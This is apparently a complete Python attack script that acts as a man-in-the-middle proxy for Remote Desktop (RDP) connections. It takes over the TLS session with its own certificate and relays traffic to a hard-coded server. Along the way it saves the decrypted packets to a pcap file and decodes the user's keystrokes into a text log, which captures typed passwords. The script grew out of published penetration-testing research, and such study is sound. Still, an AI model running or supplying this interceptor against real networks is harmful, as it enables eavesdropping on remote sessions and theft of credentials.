#!/usr/bin/env python
#DiabloHorn http://diablohorn.wordpress.com
#Inspired by: https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/
#Resources:
#   http://stackoverflow.com/questions/7574092/python-scapy-wrpcap-how-do-you-append-packets-to-a-pcap-file
#   http://efod.se/media/thesis.pdf

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
from scapy.all import *
from socket import *
import ssl
import thread
import binascii

#http://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html#ss1.4
WIN32_KEYCODES = {'\x02':'1!','\x03':'2@','\x04':'3#','\x05':'4$','\x06':'5%','\x07':'6^','\x08':'7&','\x09':'8*','\x0a':'9(','\x0b':'0)',
'\x0c':'-_','\x0d':'=+','\x0e':'<BACKSPACE>','\x0f':'<TAB>','\x10':'q','\x11':'w','\x12':'e','\x13':'r','\x14':'t','\x15':'y','\x16':'u','\x17':'i',
'\x18':'o','\x19':'p','\x1a':'[{','\x1b':']}','\x1c':'<ENTER>','\x1d':'<LCTRL>','\x1e':'a','\x1f':'s','\x20':'d','\x21':'f','\x22':'g','\x23':'h','\x24':'j',
'\x25':'k','\x26':'l','\x27':';:','\x28':'\'"','\x29':'`~','\x2a':'LSHIFT>','\x2b':'\|','\x2c':'z','\x2d':'x','\x2e':'c','\x2f':'v','\x30':'b','\x31':'n',
'\x32':'m','\x33':',<','\x34':'.>','\x35':'/?','\x36':'<RSHIFT>','\x37':'<Keypad-*>','\x38':'<LALT>','\x39':'<SPACE>','\x3a':'<CAPS>','\x3b':'F1','\x3c':'F2',
'\x3d':'F3','\x3e':'F4','\x3f':'F5','\x40':'F6','\x41':'F7','\x42':'F8','\x43':'F9','\x44':'F10','\x45':'<NumLock>','\x46':'<SCROLLOCK>','\x47':'<Keypad-7/Home>',
'\x48':'<Keypad-8/Up>','\x49':'<Keypad-9/PgUp>','\x4a':'<Keypad-->','\x4b':'<Keypad-4/Left>','\x4c':'<Keypad-5>','\x4d':'<Keypad-6/Right>','\x4e':'<Keypad-+>','\x4f':'<Keypad-1/End>',
'\x50':'<Keypad-2/Down>','\x51':'<Keypad-3/PgDn>','\x52':'<Keypad-0/Ins>','\x53':'<Keypad-./Del>','\x54':'<Alt-SysRq>'}

BUFF = 1024
OUTPUTPCAP = "output.pcap"
LISTENCON = ('0.0.0.0', 3389)
REMOTECON = ('10.50.0.125', 3389)
SAVETEXT = 1
   
def getkey(fulldata):
    if fulldata and fulldata[0:3] == '\x44\x04\x01':
        try:
            return WIN32_KEYCODES[fulldata[3]]
        except:
            return '<\\x' + fulldata[3].encode('hex') + '>'
    return '' 
    
def writetofile(data):
    f = open('output.txt','a+')
    f.write(data)
    f.close()
    
def savepcap(src,dst,data):
    pktdump = PcapWriter(OUTPUTPCAP, append=True, sync=True)
    pktinfo = Ether()/IP(src=src[0],dst=dst[0])/TCP(sport=src[1],dport=dst[1])/data
    pktdump.write(pktinfo)
    pktdump.close()
    
def handler(clientsock,addr):
    serversock = socket(AF_INET, SOCK_STREAM)
    serversock.connect(REMOTECON)
    
    #read client rdp data
    serversock.sendall(clientsock.recv(19))
    #read server rdp data and check if ssl
    temp = serversock.recv(19)
    clientsock.sendall(temp)
    if(temp[15] == '\x01'):
        print('Intercepting rdp session from %s' % clientsock.getpeername()[0])
        sslserversock = ssl.wrap_socket(serversock,ssl_version=ssl.PROTOCOL_TLSv1)
        sslserversock.do_handshake() #just in case
        sslclientsock = ssl.wrap_socket(clientsock, server_side=True,certfile='cert.pem',keyfile='cert.key',ssl_version=ssl.PROTOCOL_TLSv1)
        sslclientsock.do_handshake() #just in case
        thread.start_new_thread(trafficloop,(sslclientsock,sslserversock,True))
        thread.start_new_thread(trafficloop,(sslserversock,sslclientsock,True))
    else:
        print('Passing through %s' % clientsock.getpeername()[0])
        thread.start_new_thread(trafficloop,(clientsock,serversock,False))
        thread.start_new_thread(trafficloop,(serversock,clientsock,False))

def trafficloop(source,destination,dopcap):
    string = ' '
    try:
        while string:
            string = source.recv(BUFF)
            if string:
                if dopcap:
                    savepcap(source.getpeername(),destination.getpeername(),string)
                if SAVETEXT:
                    writetofile(getkey(string))
                destination.sendall(string)                
            else:
                source.shutdown(socket.SHUT_RD)
                destination.shutdown(socket.SHUT_WR) 
    except:
        print('some error happend')
        pass #being highly lazy
        
if __name__ == '__main__':
    serversock = socket(AF_INET, SOCK_STREAM)
    serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    serversock.bind(LISTENCON)
    serversock.listen(5)
    while 1:
        print('waiting for connection...')
        clientsock, addr = serversock.accept()
        print('...connected from:', addr)
        thread.start_new_thread(handler,(clientsock,addr))
